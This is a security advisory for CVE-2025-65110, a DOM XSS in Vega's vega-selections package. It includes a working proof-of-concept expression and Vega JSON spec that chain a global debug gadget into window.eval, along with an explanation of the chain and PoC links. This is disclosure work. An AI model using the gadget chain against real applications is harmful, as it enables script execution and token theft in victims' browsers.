# [H] Vega XSS via expression abusing vlSelectionTuples function array map calls in environments with satisfactory function gadgets in the global scope

## Summary
Severity: High
Advisory: GHSA-829q-m3qg-ph8r
CVE: CVE-2025-65110
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-01-05
Source: https://github.com/advisories/GHSA-829q-m3qg-ph8r
Type: github-advisory

## Affected
- npm: `vega-selections` — affected >=0 <5.6.3
- npm: `vega-selections` — affected >=6.0.0 <6.1.2

## Details
## Impact

Applications meeting these two conditions are at risk of arbitrary JavaScript code execution, even if "safe mode" [expressionInterpreter](https://vega.github.io/vega/usage/interpreter/) is used. 

1. Use `vega` in an application that attaches both `vega` library and a `vega.View` instance similar to the Vega [Editor](https://github.com/vega/editor) to the global `window`, or has any other satisfactory function gadgets in the global scope
2. Allow user-defined Vega `JSON` definitions (vs JSON that was is only provided through source code)

## Patches

- With Vega v6, use `vega-selections@6.1.2` (requires ESM)
- With Vega v5, use `vega-selections@5.6.3`  (No ESM needed)

## Workarounds

- Do not attach `vega` or `vega.View` instances to global variables or the window as the editor used to do [here](https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239) . This is a development-only debugging practice that should not be used in any situation where Vega/Vega-lite definitions can come from untrusted parties.

### POC Summary

Vega offers the evaluation of expressions in a secure context. Arbitrary function call is prohibited. When an event is exposed to an expression, member get of window objects is possible. Because of this exposure, in some applications, a crafted object that sets a `map` value with a function copied from the window that results in calling `this.foo(this.bar)` can be passed to the vlSelectionTuples function, calling the copied `map` function, allowing DOM XSS to be achieved. 

In practice, an accessible gadget like this exists in the global VEGA_DEBUG code. 

```js
vlSelectionTuples({
    map: event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on,
    eventName: event.view.console.log,
    _handlers:{
        undefined: 'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'
    },
    _handlerIndex: event.view.eval
})
```

### POC Details
```json
{
  "$schema": "https://vega.github.io/schema/vega/v5.json",
  "width": 350,
  "height": 350,
  "autosize": "none",
  "description": "Toggle Button",
  "signals": [
    {
      "name": "toggle",
      "value": true,
      "on": [
        {
          "events": {"type": "click", "markname": "circle"},
          "update": "toggle ? false : true"
        }
      ]
    },
    {
      "name": "addFilter",
      "on": [
        {
          "events": {"type": "mousemove", "source": "window"},
          "update": "vlSelectionTuples({map:event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on, eventName:event.view.console.log,_handlers:{undefined:'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'},_handlerIndex:event.view.eval})"
        }
      ]
    }
  ]
}
```

This payload creates a scenario where whenever the mouse is moved, the map function of the provided object is called by the code that implements the vlSelectionTuples  function. The map function has been set to a "gadget function" (VEGA_DEBUG.vega.CanvasHandler.prototype.on) that does the following:

```js
   on(a, o) {
        const u = this.eventName(a)
          , d = this._handlers;
        if (this._handlerIndex(d[u], a, o) < 0) {
        ....
        }
        ....
   }
```

1. Set `u` to the result of calling `this.eventName` with undefined 
    - For our object, we have the eventName value set to console.log, which just logs undefined and returns undefined
4. Sets `d` to `this._handlers`
    - For our object, we have this defined to be used later
5. Calls `this._handlerIndex` with the result of `u` indexed into the `d` object as the first argument, and undefined as the second two.
    - For our object, `_handlerIndex` is set to window.eval, and when indexing undefined into the `_handlers`, a string to be evald containing the XSS payload is returned.
    
This results in XSS by using a globally scoped gadget to get full blown eval. 


### PoC Link

Navigate [here](https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1axACAGU4EEoB4JN5pkEIAAKYDIHCod41SjEGhwWSUABqAFEAOIAQQA+gARemhACqjIpfEoAGEkOJ8hAABIihRBZyUHDONgmJotSgSKTBMmYAByZzgpOqmApVJpUAkYiClACfikrJgUpl+GADChcDWNHEcAUqAA5PE4M5MPi2K5aOJggBqYIAA2CAA0USjghJgqRnGZk1HIwyWRyuby6Uy2QyAEoogCSAHktQBKb2TW32-1ll0AD31H0NlOplCq8XG1YOx2OQA), move the mouse, and observe that the arbitrary JavaScript from the configuration reaches the eval sink and DOM XSS is achieved.

For a PoC that works even with the AST evaluator, abusing function call gadgets to get access to window.eval with more advanced gadgets, navigate [here](https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1axACAGU4EEoB4JN5pkEIAAKYDIHCod41SjEGhwWSUABqAFEAOIAQQA+gARemhACqjIpfDpVJpOGcbBMTRalFZziccEwACUPo4Zc4pNKlXAVag9nA1ejUAByKrxA16gKhGhQw3xTWYfFsVy0cTBADUwQABsEABoolHBCTBUjOMwB91uhksjlc3l0plshnylEASQA8gA5ACUpstdBo8QscFJ1UwFKFscjnJ5fNIFEoiqhms1lBFYrFPylATYlzVncumqLHxLlOp4wzB2OxyAA)

### Future investigation

In cases where `VEGA_DEBUG` is not enabled, there could theoretically be other gadgets on the global scope that allow for similar behavior. In cases where AST evaluator is used and there are blocks against getting references to `eval`, in theory there could be other gadgets on global scope (i.e. jQuery) that would allow for eval the same way (i.e. `$.globalEval`). As of this writing, no such globally scoped universal gadgets have been found. 

### Recommended Fix
In the `selectionTuples` [implementation](https://github.com/vega/vega/blob/21677ce895460ca56b7173d64f1883f29cf4bcc4/packages/vega-selections/src/selectionTuples.js#L12) that backs the vulnerable function call, the code should be changed to check `Array.isArray(array)` before calling a potentially dangerous user provided `.map` on the `array` argument.

### Impact

This vulnerability allows for DOM XSS, potentially stored, potentially reflected, depending on how the library is being used. The vulnerability requires user interaction with the page to trigger.  

An attacker can exploit this issue by tricking a user into opening a malicious Vega specification. Successful exploitation allows the attacker to execute arbitrary JavaScript in the context of the application’s domain. This can lead to theft of sensitive information such as authentication tokens, manipulation of data displayed to the user, or execution of unauthorized actions on behalf of the victim. This exploit compromises confidentiality and integrity of impacted applications.

## References
- https://github.com/vega/vega/security/advisories/GHSA-829q-m3qg-ph8r
- https://nvd.nist.gov/vuln/detail/CVE-2025-65110
- https://github.com/vega/vega
